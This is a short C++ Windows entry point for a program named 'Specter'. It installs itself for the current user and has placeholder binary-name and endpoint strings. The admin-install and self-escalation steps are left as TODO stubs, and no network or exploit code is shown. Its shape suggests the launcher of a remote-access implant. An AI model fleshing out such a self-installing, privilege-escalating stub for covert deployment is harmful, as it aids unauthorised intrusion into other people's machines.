#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include "SpecterBasicDeployment.hpp"
#include "SpecterLib/SelfProcessUtils.h"


int WINAPI wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int)
{
	const std::wstring kProgramName = L"BINARY_NAME";
	const std::wstring kProgramPath = kProgramName + L".exe";
	const std::wstring kBaseEndpointUri = L"BASE_ENDPOINT";


	if (SelfProcessUtils::IsProcessElevated())
	{
		// TODO Admin Install Mode and then Exit
	}
	else if (false) // Attempt self escalation if not already attempted once
	{
		// TODO Self Escalation Code
		// Run self with priveleges
		// If successful, exit, if failed, continue to basic deployment
	}

	// Deploy as normal user
	SpecterBasicDeployment deployement(kProgramName, kProgramPath);

	if (!deployement.IsInstalled())
	{
		deployement.Install();
	}

	return 0;
}
